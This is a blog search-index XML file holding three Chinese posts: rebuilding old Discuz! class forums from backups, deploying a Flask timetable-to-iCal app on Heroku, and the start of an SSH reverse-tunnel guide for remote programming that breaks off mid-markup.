<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>小想法 | 重建那些年基于Discuz!系统搭建的满是回忆的班级网站</title>
      <link href="/2020/01/09/Idea_RebuildClassWebsite/"/>
      <url>/2020/01/09/Idea_RebuildClassWebsite/</url>
      
        <content type="html"><![CDATA[<p><strong>2020年第一篇哈，先祝大家新年快乐，每天都有新收获喵！</strong>  </p><p>哇呜！今天终于下了今年的第一场雪，贼惊喜~（然而积不起来啊嘤嘤嘤</p><p><br><br></p><hr><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote><p>最近期末考试月忙死了，刚考完一科，难得有空来浪一下。考完一科浪两天然后作死复习的是我了emmm嘤嘤嘤。</p></blockquote><p>有一次和奶冰冰聊天，回忆起之前折腾过的、搭建过的各种网站，而后就想到了N年以前搭建的班级网站。</p><p>（很明显，那时候提供网络服务的各种空间、域名什么的到现在没几个还能用的了。</p><p>2017年10月的时候，我的邮箱突然收到了一封来自Red Hat的邮件，提醒我OpenShift Online v2 <strong>End of Life</strong>了。↓</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life.jpg" alt="End_of_Life" style="max-width:40%;"><p>那时候感觉特别惊喜，毕竟到那时已经放在那上面四五年了，我都差点忘记它的存在了。虽然域名早就炸了，但是这个<em>免费的</em>云平台居然还在（这个角度看来 Red Hat 还是挺可靠的233）。</p><p>那时就登上去看了一下，哇呜数据居然都还在，通过默认的域名还访问到了网站，于是好怀念啊，为了留个纪念就截了个图。</p><blockquote><p>N年前先建了10班的班网论坛，<em>（分班后）</em>又建了个8班的班网。    </p></blockquote><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot2.jpg" alt="img" style="max-width:50%;"><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="img" style="max-width:50%;"><p>​    几天之后，果不其然，<strong>Unavailable了</strong>。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/end_of_life2.jpg" alt="End_of_Life2" style="max-width:43%;"><p>不过还好那时候就有备份的好习惯（不是），试了几个密码登录进了8班的班网，然后把数据库给备份下来了，不过也只备份了数据库，附件啊头像啊这些就没备份下来。10班的班网（更是由于记不得密码了）就没成功备份emmm。</p><blockquote><p>于是现在就觉得有点遗憾，通过<em>phpMyAdmin</em>其实可以直接导出数据库的；在重建的时候知道通过修改数据库可以把创始人密码修改的。</p><p>但那时候不大清楚这些，也有可能是那时连服务器密码都不记得了（（（</p></blockquote><hr><p>最近这几天就想，干脆试一下，看看能不能重建那时候的班网吧。</p><h2 id="重建折腾记"><a href="#重建折腾记" class="headerlink" title="重建折腾记"></a>重建折腾记</h2><h3 id="辣鸡服务器配置出了一堆问题"><a href="#辣鸡服务器配置出了一堆问题" class="headerlink" title="辣鸡服务器配置出了一堆问题"></a>辣鸡服务器配置出了一堆问题</h3><p>之前都没有自己动手在裸机上配置WEB环境来着，Linux也没有多少经验，于是乎上手就比较痛苦。</p><blockquote><p>下面是一堆废话emmm</p><p><strong>不想看就直接跳过这节吧。</strong></p></blockquote><p>租服务器的时候<em>图省事</em>直接装了<code>PHPStudy</code>，里面集成了<code>LNMP</code>环境，然后网站什么的直接可以在上面配置。</p><p>之前搭了几个测试用的网站，运行都没什么问题，能正常访问。</p><p>然而这次我建了一个新的<code>PHP</code>环境，打开端口，访问的时候居然报<strong>403无权限</strong>，但是其他的网站都没这个问题。</p><p>看到网页上是<code>nginx</code>报的错，很自然怀疑就是它的问题。检查了一下配置没发现问题，于是重装了一下。这回直接报<strong>500内部服务器错误</strong>了。（我愣住了</p><p>看了一下错误log，发现很多是无权限，还有的找不到文件？？？</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/error_log.png" alt></p><p>复制粘贴搜了一下，怀疑是动态链接库的问题，于是<code>ln</code>尝试创建链接，然而不成功。</p><p>然后不想管了，关闭<code>nginx</code>服务，启动<code>apache</code>服务，这回还是<strong>403</strong>，其他的网站就没问题，绝了。</p><p>换回<code>nginx</code>，将配置文件中的<code>user</code>由<code>www</code>更改为<code>root</code>，再试居然好了！看来果然是<strong>权限的问题</strong>，然而我之前好像并没有改过什么配置，也不清楚<code>www</code>用户为啥就没权限了。</p><p><code>root</code>毕竟不太安全吧，于是又改了回去，403了。</p><p>登录服务器看了一下，几个网站目录下就只有新建的这个用户组是<code>root</code>，修改了目录权限，允许others执行，再访问，没问题了。</p><p>但很奇怪啊为啥就不行啊。</p><p>于是又重装了一次<code>nginx</code>，同时还卸掉了它的防火墙，这次没问题了emmm。再装回防火墙，又炸了。</p><p>WAF的问题啊。</p><p>这时候后台改参数也有报无权限的，就很懵逼。</p><p>于是干脆直接<code>reboot</code>好了。</p><p><strong><em>（有句话说得好，重启解决绝大部分问题</em></strong></p><p>进入后台，先关闭<code>nginx</code>，重装WAF，再开启<code>nginx</code>。这回终于没毛病了。（x</p><br><hr><h3 id><a href="#" class="headerlink" title></a><br></h3><h3 id="重建8班班网"><a href="#重建8班班网" class="headerlink" title="重建8班班网"></a>重建8班班网</h3><p>重建其实类似于搬家，于是看了几篇关于<code>Discuz!</code>搬家的教程，发现距今都有一段历史了。</p><p>去官方论坛找到了最新的<strong>X3.4版本</strong>的下载链接，发现指向了gitee，刚开始还觉得有点意思，然而当我点开链接发现连接不上gitee服务器，难道炸了？？？换了一个网络，连上了。（吐槽一下辣鸡宽带，估计是DNS出了点问题8  </p><p><strong>啊不是！！！</strong></p><p>别想着啥都想装最新的，得先考虑你要<strong>重建/恢复的系统是什么版本</strong>的啊！还要注意<strong>PHP的版本</strong>，以及<strong>语言编码（GBK/UTF8/BIG5/？）</strong>（就因为这个删掉又重建了好几个版本</p><p>论坛的版本可以在你备份的数据库<code>.sql</code>文件头部注释里看到。（这个还是后面重建10班班网时才发现的</p><p>不要像我一样装了发现用不了嘤嘤嘤。</p><ul><li><code>upload</code>文件夹打包传到服务器上，解压，然后访问网站。</li></ul><blockquote><p>草怎么又403了。</p></blockquote><blockquote><p>检查了一下文件发现是root所属，原来是之前一直以root身份操作的问题，更改用户组为<code>www</code>，这回能正常访问了。</p></blockquote><ul><li>按照安装流程全新安装<code>Discuz!</code>系统。这里的数据库要自己提前建好，表前缀和你要重建的一致，一般就不用更改。  </li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot1.png" alt></p><ul><li>安装完成，访问主页是默认的界面。（略）</li><li>根据官方的搬家教程，把<code>utility/restore.php</code>文件上传到网站的<code>data/</code>目录下，再把要恢复的数据库整个目录也上传到<code>data/</code>下，然后通过<code>网站域名/data/restore.php</code>访问数据恢复页面。</li></ul><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot2.png" alt></p><blockquote><p>然而这里我被自己的WAF给拦住了233。</p><p>开了白名单再导入，这时候过了一段时间报<strong>504</strong>了emmm。（我又懵了，难得让我见到了好多错误页面，我没事的嘤嘤嘤  </p><p>重试，如旧，同时发现cpu是100%在跑的（唉性能果然不咋样。</p></blockquote><blockquote><p>搜了各种资料，把nginx的超时和PHP执行时间都改了，还是504…  </p><p>看了一下<code>.sql</code>文件，干脆不用整个工具，直接导入mysql好了啦。  </p><p>虽然期间还报了几个错，但还是导完了呢。</p></blockquote><ul><li><p>访问主页，哇好惊喜啊，之前的分类、帖子什么都回来了。</p></li><li><p>用原始的创始人账号登录后台，<strong>更新缓存</strong>。</p><blockquote><p>这里也折腾了老半天，不是安装论坛系统时候创建的，而是重建的老用户。</p><p>毕竟整个数据库都改回去了嘛。</p><p>至于忘记密码，emmm后面再说。</p></blockquote></li><li><p>再刷新主页，这回数据基本能正常访问了，页面配置也恢复到了之前的状态。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-17-56-47-58.jpg" style="max-width:40%;"></li><li><p>（如果有的话）<strong>恢复logo、favicon、attachment、avatar、plugin、template等。</strong></p><p>这里由于之前只备份了logo，其他数据基本没备份（或者说我的硬盘里没备份）emmm，就么的办法了。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-02-23-26-12.png" alt="恢复后的班网" style="max-width:50%;"></li></ul><p>看了看上面的帖子，<em>全是黑历史啊</em>……（黑脸.png</p><p>用户数据都恢复了，理论上能用原来的信息进行登录。</p><p>然而图片什么的都没了，之前很多外链的图片、插件都失效了，其实问题也不大吧。</p><p><strong>不过能重建了也总比没有要好呀！嘻嘻嘻。</strong></p><p>毕竟这个版本有很多安全漏洞了，<strong>出于安全考虑，这里就不公开了啦</strong>。</p><p><br><br></p><hr><br><h3 id="重建10班班网"><a href="#重建10班班网" class="headerlink" title="重建10班班网"></a>重建10班班网</h3><p>上面说了云平台<code>End of Life</code>的时候没有备份这个数据的。</p><p>但是我找遍了硬盘，终于<strong>翻出了那时候备份的部分数据</strong>。</p><p>有了上面重建的经验，本以为就很轻松上手的，没想到还是遇到了一堆问题。  </p><p>首先还是版本的问题。</p><p>本以为<code>X3.2</code>版本已经够老了，没想到这里最后一直回退到了<strong><code>X2</code>版本</strong>（噗</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot3.png" alt="安装过的版本"></p><p><strong><em>鬼懂得我重建了多少次网站emmmm</em></strong></p><ul><li>期间有一次是<strong>PHP版本错了</strong>，毕竟之前的版本一般只支持5.x来着，然后我装了7.x。</li></ul><ul><li>有一次是<strong>MySQL数据库炸了</strong>，装完之后主页都打不开，直接报的<code>database error</code>。然后卸掉了数据库，换了老一点的版本，发现装好了永远启动不了。最后发现是之前卸载有残留，绝了。清了一遍残留重装，再重启服务就好了。</li></ul><ul><li>还有一次是<strong>Discuz版本</strong>装的<code>X2.5</code>，本来挺开心的，导完数据更新完缓存，点开帖子就报<code>database error</code>，说找不到某某记录吧。最后版本降到<code>X2</code>终于好了，估计是版本升级过程中修改了这部分数据库或操作数据库的代码吧。</li></ul><ul><li>还有每一次都遇到了<strong><code>.sql</code>导不进数据库</strong>的问题，因为这个数据库更大了，即使改了nginx和PHP的配置，在网页上导入还是永远报504，最后是一边看着CPU状态，一边从后台导入的。前端报了504，CPU还在跑，虽然SQL还报过好几种错但最后还是导入完成了。。（我太难了</li></ul><ul><li><p>噢还有那个<strong>创始人密码忘了</strong>的问题。</p><p>查了一下资料，一个方案是尝试登录<code>UC_Center</code>，如果成功登录的话可以在里面更新创始人的密码，再用更新后的密码登录<code>Discuz</code>的管理后台就行了。（这里用的就是这个方案）</p><p>另一个方案是修改数据库里面的用户相关的表，先改成一个比较简单的密码（好像是MD5加密），登录进去再修改。这里没用试过就不说了啦。</p></li></ul><hr><p><strong>重建完成之后访问主页。</strong></p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-08-23-23-25-80.png" alt></p><p>草，原来这个是那时候<strong>更新版本前的最后一次备份</strong>emmm</p><p>（看亚子是第四代，最后更新的是第五代了，看了半天才想起来）</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot4.png" alt="10班班网重建"></p><p>找了一下发现部分附件和头像之类的也有备份（更古老的数据了）。于是又折腾了一会儿把能恢复的数据给恢复了。</p><p>于是乎最后重建出来的是2013年1月的备份了。</p><p>怎么说好呢，其实问题也不大吧，<strong>真·回忆啊！</strong></p><img src="/2020/01/09/Idea_RebuildClassWebsite/Screenshot_2020-01-09-01-57-55-85.jpg" style="max-width:50%;"><p>这个版本的安全漏洞更多了，同样就<strong>不公开了，看看就好了啦</strong>。</p><p><br><br></p><p>emmm下面这个是<strong>恢复不了的第五代版本</strong>（真就只有这张图了嘤嘤嘤）。</p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_screenshot1.jpg" alt="第五代班网" style="max-width:50%;"><p><br><br></p><hr><p><br><br></p><h2 id="一些想法"><a href="#一些想法" class="headerlink" title="一些想法"></a>一些想法</h2><ol><li><p>Linux权限管理还是很严格的，这回体验到了，有空再研究研究。</p><br></li><li><p>选对合适的版本，不要总想着用最新的。</p><br></li><li><p>看了<code>Discuz!</code>系统之前的老版本，都是把GBK编码的版本放在前面，不过现在都是推荐安装UTF-8编码版本了。</p><p>包括其他很多地方基本上就UTF-8了，感觉也算是个趋势吧，毕竟是国际编码，通用性强嘛。</p><br></li><li><p>去<code>Discuz!</code>官方论坛看了看，感觉明显冷清了。包括在后台看插件应用市场，基本上就变成了商业化的交易了，就有点怀念N年前那时候社区还很活跃，有一堆免费的还互相分享来着。（不过也算是时代趋势吧233</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_plugin.png" alt="部分之前备份的插件"></p><br></li><li><p>其实还找到了以前可能折腾过的各种建站系统233。</p><p><img src="/2020/01/09/Idea_RebuildClassWebsite/backup_websystem.png" alt="可能折腾过的各种建站系统"></p><br></li><li><p>然后就想到<strong>纸飞机</strong>了嘤嘤嘤。今天去看了一下，发现纸飞机还能访问i，只是论坛关闭了，个人空间和视频区还是开放的，而且版本是X3.4算是最新的大版本了。（不知道于老板是不是还维护过</p><br></li><li><p>写这篇blog的时候又去<code>OpenShift</code>看了一下，发现现在都升级到 V4.2 版本了。增加了很多现在很实用很热门的<code>Serverless</code>、 <code>CI/CD</code>之类的，现在的<code>Starter plan</code>也是免费的，不过感觉加了不少限制吧（毕竟减少滥用节约资源嘛）。感兴趣的还可以看看下面的链接。</p></li></ol><blockquote><p>版本介绍：<a href="https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/" target="_blank" rel="noopener">https://blog.openshift.com/introducing-red-hat-openshift-4-2-developers-get-an-expanded-and-improved-toolbox/</a></p><p>产品介绍：<a href="https://www.openshift.com/products/online/" target="_blank" rel="noopener">https://www.openshift.com/products/online/</a></p></blockquote><p>​        <br></p><ol start="8"><li><p>备份是个好习惯，<strong>CTRL+S</strong>也是。</p><br></li><li><p>看了看之前的帖子，发现全都是黑历史……</p><p>然后惊喜地发现，之前的外链难得有几个还能访问，进去一看发现是以前的教育博客，居然一直运营到了现在，而且以前的文章都在。全是回忆啊。。</p><p>等我有空再把上面以前发的文章爬下来备份一份23333.</p><br></li><li><p>有问题欢迎来交流哈哈哈。</p></li></ol><p>溜了溜了喵</p>]]></content>
      
      
      <categories>
          
          <category> 小想法 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> 日常生活 </tag>
            
            <tag> Discuz </tag>
            
            <tag> 班网 </tag>
            
            <tag> 重建 </tag>
            
            <tag> WEB </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NUAA_iCal_Web在线版本部署</title>
      <link href="/2019/12/29/Tech_NUAAiCalWeb_deploy/"/>
      <url>/2019/12/29/Tech_NUAAiCalWeb_deploy/</url>
      
        <content type="html"><![CDATA[<blockquote><p>主要是简单记录一下Heroku的部署，毕竟一不小心就忘记该怎么折腾的了…</p><p>（其实应该两周前写这篇blog的，现在已经忘了很多了嘤嘤嘤  </p></blockquote><h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>之前折腾了一两个月，做了个把课表导出到ical日历文件的小jio本，即 <code>NUAA_ClassSchedule</code><br>GitHub链接：<a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">click here</a><br><a href="https://github.com/miaotony/NUAA_ClassSchedule" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_ClassSchedule</a>  </p><p>其中有一个TODO是搭建一个web端，实现在线导出。</p><p>实际上，在教务系统加入验证码之前，已经和奶冰一起做了一个可以用的web端了，只不过只是简单测试还没公开啥的。</p><p>然而，这个验证码一加就麻烦了……之前做的登录显然就不成功了。</p><p>解决方案的话，在本地，是通过把验证码下载下来，PIL调用本地图片查看器来显示，进而在命令行里输入。</p><p>不过web端就有点麻烦了。</p><p>但怎么说好呢，不妨碍用同样的思路解决这一问题呢嘻嘻嘻。后面再说。</p><blockquote><p>其实到写这篇blog为止还没弄清楚他验证码的具体机理。（等我考完试有空再折腾好了喵</p></blockquote><p><strong>不想往下看又想体验<code>NUAA_iCal_Web</code>在线版本的，<a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">点这里</a>访问吧。</strong>   </p><p><br><br></p><hr><h2 id="Deploy"><a href="#Deploy" class="headerlink" title="Deploy"></a>Deploy</h2><h3 id="Heroku简介"><a href="#Heroku简介" class="headerlink" title="Heroku简介"></a><em>Heroku</em>简介</h3><p>偶尔有一天在转GitHub的时候，看到某个项目下有个网页端的界面，README里面也有个<code>deploy with heroku</code>之类的图标按钮。点进去看了看，然后再查了查资料。</p><blockquote><p><em>Heroku</em> is a platform as a service (PaaS) that enables developers to build, run, and operate applications entirely in the cloud.  </p></blockquote><blockquote><p>Heroku是一个支持多种编程语言的云平台即服务。在2010年被Salesforce.com收购。Heroku作为最开始的云平台之一，从2007年6月起开发，当时它仅支持Ruby，但后来增加了对Java、Node.js、Scala、Clojure、Python以及（未记录在正式文件上）PHP和Perl的支持。基础操作系统是Debian，在最新的堆栈则是基于Debian的Ubuntu。</p></blockquote><p>好东西呀！</p><p>发现heroku可以在一定程度上免费搭建网站，当然前提是要有一个wsgi接口之类的，大概意思就是说需要让你的东西能通过网络访问得到。  </p><blockquote><p>其实那时候我连wsgi是啥都不知道……  </p></blockquote><p>官网链接：<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>具体的定价策略参见<a href="https://www.heroku.com/pricing" target="_blank" rel="noopener">这里</a>。  </p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/price.png" alt="price">  </p><p>Free版本的话，未认证用户每个月550小时免费动态时长，认证用户（好像是绑定银行卡）1000小时；30分钟无访问无活动的话会自己睡大觉，不会占用你的宝贵时长；提供二级域名，还可以自己绑米。  </p><p><strong>对于nuaaical来说，这个完全够用了呢！</strong>  </p><p>那就干脆折腾一下好了。  </p><p><br><br></p><h3 id="NUAA-iCal-Web端搭建"><a href="#NUAA-iCal-Web端搭建" class="headerlink" title="NUAA iCal Web端搭建"></a>NUAA iCal Web端搭建</h3><p>需要一个wsgi接口之类的嘛，flask、django这些现成的就行。</p><p>本来就啥也不知道也没玩过，看来一下flask挺简单的，于是就简单学了一下<strong>flask框架</strong>。</p><p>然而真正搭建的过程中遇到了一堆奇妙的bug，本地跑着好好的，上了heroku就炸了。（这个不细说了  </p><p>实际上代码就是从本地版本改的，毕竟在开发的时候留了很多现成的接口了，改一改调用一下函数之类的就完事了。</p><p>不过这个<strong>验证码</strong>折腾了老半天。</p><p>这里的策略是，当你访问页面的同时，后端去访问教务系统，把验证码图片爬下来送给前端，同时建立了一个与你有关的session。</p><p>当你post用户名密码及验证码后，后端利用同一个session去访问教务系统，<br>进而爬取课表及考试信息，<br>生成icalendar日历文件，<br>而后以附件下载的形式构造response，从而得到属于你的ical课表。  </p><br><p>当然，一定程度上安全一点，这个session在构造完response之后就销毁了，不保留在云平台上。</p><p>（这样其实还是没搞清楚验证码的机理，一定程度上相当于绕过了而已。</p><p>其实到这的话，本地搭建就结束了。</p><hr><p>不过还考虑了一下<strong>复杂的生产环境</strong>……  </p><ul><li><p>比如说<strong>登录信息重复post</strong>，而原来的验证码就不再有效了。</p><p>这里其实想了几种方案，但是行不通。最后干脆折腾了一波HTML，加了个前端界面，如果没登陆成功就提示一下，然后过一会儿返回主页好了。233</p><p><strong>（有更好的方案欢迎提出喵！</strong></p></li><li><p>比如<strong>未登录情况下直接访问导出ical的页面</strong>  </p><p>这个也是直接返回主页了。不过这里这个判断折腾了老半天。</p><p>最后的方案是在flask的session里建立了一个属于当前session的bool变量，默认为False，登录以后设置为True。</p><blockquote><p>之前直接写在程序的全局变量里，本地跑着好好的，上云平台就炸了……再见。   </p><p>还写过在flask的g变量里，后来仔细查了资料，g变量好像是只在当前页面请求中有效，意思就是作用范围不一样，于是否决了。</p></blockquote></li><li><p>教务系统<strong>连接已重置</strong></p><p>这个是他教务系统的问题啊，难顶了。还是折腾了老半天才发现这里的问题。  </p><p>又改了改登录的延时，这回变成随机延时了，而且时间也加长了。  </p><p>而且还把爬虫的UA改成了当前浏览器的UA。IP的话好像没办法了。   </p><p>问题有所改善…然而偶尔还存在。</p><p><strong>大不了多试几次就好了。</strong></p></li><li><p>etc.</p></li></ul><blockquote><p>其实还有个打算是做个前端ifram框架之类的直接嵌套官方的登录界面，然后登录成功后再利用登录信息来爬取课表，这样一定程度上可能还更安全一点。<br>再说吧……</p></blockquote><br><hr><br><h3 id="Heroku搭建"><a href="#Heroku搭建" class="headerlink" title="Heroku搭建"></a>Heroku搭建</h3><p>下面来简单记录一下Heroku的部署。</p><ol><li><p><strong>注册一个账号</strong></p><p>网址<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.heroku.com%2F" target="_blank" rel="noopener">https://www.heroku.com/</a></p><p>略。建议用gmail，不过也看到用国内邮箱也成功的。  </p></li></ol><ol start="2"><li><p><strong>安装Heroku CLI 命令行接口</strong></p><p>Win-x64：<a href="https://cli-assets.heroku.com/heroku-x64.exe" target="_blank" rel="noopener">下载地址</a></p><p>其他环境的见官网好了。<a href="https://devcenter.heroku.com/articles/heroku-cli" target="_blank" rel="noopener">https://devcenter.heroku.com/articles/heroku-cli</a></p><p>安装完之后就可以在命令行用<code>heroku</code>命令了。</p></li></ol><ol start="3"><li><p><strong>登录</strong></p><pre class=" language-bash"><code class="language-bash">heroku login</code></pre><p>会弹出网页登录验证，或者在命令行登录。</p></li></ol><ol start="4"><li><p><strong>准备好app</strong></p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229023615517.png" alt="支持的app"></p><p>你看他支持的语言挺多的呢。</p><p>我这里用到的就是python啦。</p><p>这个在上一节已经搭建好了喵。</p></li></ol><ol start="5"><li><p><strong>创建app</strong></p><pre class=" language-bash"><code class="language-bash">heroku create</code></pre><p>这时候同时建立了一个名为<code>heroku</code>的git remote仓库，连接到了你本地的git仓库。</p><p>当然也可以现在网站上创建一个应用，再clone</p><pre class=" language-bash"><code class="language-bash">heroku git:clone -a nuaaical<span class="token function">cd</span> nuaaical</code></pre><p>这里前提是建立好了名为<code>nuaaical</code>的应用了。</p></li><li><p><strong>建立依赖相关的<code>requirements.txt</code></strong></p><p>略。</p></li></ol><ol start="7"><li><p><strong>指定执行的入口</strong></p><p><strong>这里算是一个坑吧，折腾了好久才发现。</strong></p><p>你必须先在代码目录下建立一个名为<code>Procfile</code>的文件，在里面写上你要他执行的命令。比如执行一个python文件之类的。</p><p>在这里用的是<code>gunicorn</code>来建立一个web应用。（flask只用于本地测试使用</p><pre><code>web: gunicorn web:app</code></pre><p>第二个<code>web</code>是文件名（<code>web.py</code>），<code>app</code>是flask实例化的对象啦。<br>（代码里写的<code>app = Flask(__name__)</code>  </p></li></ol><ol start="8"><li><p><strong>指定用构建语言（可略？）</strong></p><pre class=" language-bash"><code class="language-bash">heroku buildpacks:set heroku/python</code></pre><p>显示指定用python来构建打包（网上有的说不指定会报错？</p></li></ol><ol start="9"><li><p><strong>部署代码</strong></p><p>终于可以部署了呀！直接push好了。</p><pre class=" language-bash"><code class="language-bash"><span class="token function">git</span> push heroku master</code></pre><p>如果不行的话加上<code>-f</code>强制push<strong>（小心一点）</strong>。</p><p>然后可以看到部署的日志，如果有问题就再看看。</p><p>没问题的话，效果类似下面的。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/push.png" alt="push"></p></li></ol><ol start="10"><li><p><strong>看看你的网站吧</strong></p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">open</span></code></pre><p>然后会调用你的浏览器打开。</p><p>或者自己在浏览器访问就好了。</p></li></ol><p><strong>嘻嘻嘻，到这就结束啦~</strong></p><p><br><br></p><h3 id="拓展"><a href="#拓展" class="headerlink" title="拓展"></a>拓展</h3><p>当然还有一些<strong>常用命令</strong>，比如：</p><ul><li><p>查看日志<strong>(debug必备了)</strong></p><pre class=" language-bash"><code class="language-bash">heroku logs --tail</code></pre></li><li><p>看一下还有多少剩余时长</p><pre class=" language-bash"><code class="language-bash">heroku <span class="token function">ps</span></code></pre></li><li><p>打开app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>1</code></pre></li><li><p>关闭app服务</p><pre class=" language-bash"><code class="language-bash">heroku ps:scale web<span class="token operator">=</span>0</code></pre></li><li><p>etc.</p></li></ul><blockquote><p>官方文档<code>Getting Started on Heroku</code>看这里 <a href="https://devcenter.heroku.com/start" target="_blank" rel="noopener">https://devcenter.heroku.com/start</a></p></blockquote><p><br><br></p><p>除此以外，Heroku还支持<code>pipeline</code>，还可以授权从GitHub上同步部署，还有容器啥的……</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/image-20191229033131933.png" alt></p><p>感觉还是挺不错的呢！  </p><p><br><br></p><hr><h2 id="Achievements"><a href="#Achievements" class="headerlink" title="Achievements"></a>Achievements</h2><p>部署好的web端网址：</p><p><a href="https://nuaaical.herokuapp.com/" target="_blank" rel="noopener">https://nuaaical.herokuapp.com/</a></p><p><strong>欢迎来试试呀！</strong></p><p>第一次访问可能会花一些时间，等一等吧。</p><p>如果不成功的话刷新一下页面（但不要重复提交登录信息），或重新开一个页面访问。</p><p>同时多人访问的话也可能会有问题（没试过），那就再试试吧。（摊手</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend.png" alt="前端"></p><blockquote><p>好了我知道这个页面丑了。现学的HTML，别说了。</p><p>其实之前奶冰奶冰奶冰冰做了一个前端的↓ </p><p>后面再折腾吧咕咕咕</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/frontend_vue.png" alt="vue.js前端"></p><p><strong>欢迎来贡献代码呀！</strong></p></blockquote><blockquote><p>其实之前还折腾了老半天，尝试了<strong>在Azure上部署</strong>，也成功了。</p><p>需要在VSCode中进行部署，然后在配置里设好启动命令（也可以是一个文件）。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_deploy.png" alt="Azure_deploy"></p><p>不过现在Azure服务到期了。部署的网站也停止了呢。</p><p>截个图纪念一下吧。</p><p><img src="/2019/12/29/Tech_NUAAiCalWeb_deploy/Azure_website.png" alt="Azure_website"></p><p>（hackathon的时候白嫖的Azure还是挺爽的233  </p></blockquote><p>同时，<strong>代码开源在GitHub上了。欢迎来点个star，提个PR喵！</strong>   </p><p><a href="https://github.com/miaotony/NUAA_iCal_Web" target="_blank" rel="noopener">https://github.com/miaotony/NUAA_iCal_Web</a></p><p><br><br></p><p><strong><em>仅供学习研究，未经允许禁止商用，谢谢。</em></strong></p><p>文章中不免存在问题，欢迎提出。  </p><br><h2 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h2><ol><li><a href="https://devcenter.heroku.com/" target="_blank" rel="noopener">https://devcenter.heroku.com/</a></li><li><a href="https://www.jianshu.com/p/191248ad2639" target="_blank" rel="noopener">https://www.jianshu.com/p/191248ad2639</a></li></ol><p><br><br></p><blockquote><p>浪够了，继续准备考试。（真难顶……</p><p>期末冲冲冲！</p><p>说不定这是今年最后一篇blog了喵。</p><p>溜了溜了。</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Technology </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 小想法 </tag>
            
            <tag> WEB </tag>
            
            <tag> iCal </tag>
            
            <tag> Heroku </tag>
            
            <tag> 部署 </tag>
            
            <tag> flask </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>小想法 | 基于VSCode和ssh实现远程编程/炼丹</title>
      <link href="/2019/12/21/Idea_RemoteProgramming/"/>
      <url>/2019/12/21/Idea_RemoteProgramming/</url>
      
        <content type="html"><![CDATA[<h2 id="Cause"><a href="#Cause" class="headerlink" title="Cause"></a>Cause</h2><p>在内网有一台服务器，能连接外网但由于没有公网 IP 而无法在外网直接访问，之前想要在上面跑程序的时候，就得通过远程桌面进行操作。虽然 <code>Teamviewer</code> 速度还可以，但总感觉有点不太爽……  </p><p>很久以前（大概一两个月前）就在逼乎上看到过一篇文章说可以</p><blockquote><p><strong>使用vscode进行远程炼丹</strong>  <em>（原文见 Reference #1</em></p></blockquote><p>噫！我来兴趣了，而且其实早就想试试了，然而之前在忙别的没空折腾<del>（其实现在也没空）</del>，就是前几天在配服务器环境的时候<del>（麻烦到爆炸，最讨厌配环境了）</del>，一想干脆就再折腾一下，弄好远程炼丹（编程）吧。  </p><p>于是乎就这样连Linux命令都不知道几个的憨憨瞎折腾了一两天的ssh，终于实现了远程炼丹，<strong>贼有成就感嘻嘻嘻</strong>。</p><p>其中遇到了一些奇怪的问题，简单记录一下，也方便我忘了再回来看看吧。</p><p>时间有限，VSCode的部分就大概提一下思路，<strong>重点是<code>ssh</code>的部分</strong>吧……   </p><h2 id="Guidance-for-ssh"><a href="#Guidance-for-ssh" class="headerlink" title="Guidance for ssh"></a>Guidance for ssh</h2><p>不妨假设如下，<strong>记清楚了噢，后面频繁用到的</strong>。</p><table><thead><tr><th>computer</th><th>IP/address</th><th>info</th></tr></thead><tbody><tr><td>内网服务器A</td><td>172.x.x.x</td><td>可以访问外网，但外网不能直接访问A</td></tr><tr><td>公网服务器B</td><td>test.com</td><td>可以访问外网，也可被外网访问</td></tr><tr><td>能够联网的主机C</td><td>-</td><td>想要在C上对A进行访问</td></tr></tbody></table><h3 id="内网服务器A上的设置"><a href="#内网服务器A上的设置" class="headerlink" title="内网服务器A上的设置"></a>内网服务器A上的设置</h3><p>A设置反向代理到B的 port1 端口  </p><blockquote><p>工作原理：<br>1、本地主机和远程主机建立连接；<br>2、远程主机上分配了一个 socket 侦听 port 端口；<br>3、远程端口上有了连接, 该连接就经过安全通道转向本机的端口。   </p><p>备注：root 登录远程主机才能转发特权端口。</p></blockquote><pre class=" 